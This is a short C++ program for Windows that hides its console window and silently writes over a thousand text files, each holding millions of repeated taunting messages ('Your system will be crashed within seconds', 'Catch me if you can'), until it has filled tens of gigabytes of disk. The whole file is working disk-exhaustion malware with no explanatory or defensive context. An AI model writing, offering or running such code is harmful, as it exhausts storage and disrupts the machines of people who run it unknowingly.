#include <iostream>
#include <fstream>
#include <windows.h>
using namespace std;
int main()
{
    FreeConsole();
    int total = 1000;
    for(int i = 0;i<=total;i++){
        ofstream virus;
        string x = "  Your system will be crashed within seconds  ";
        string y = "  Catch me if you can  ";
        virus.open(to_string(i)+".txt");
        for(int j = 0;j<=1000000;j++){
            virus<<x;
            virus<<y;
        }
        virus.close();
    }
}
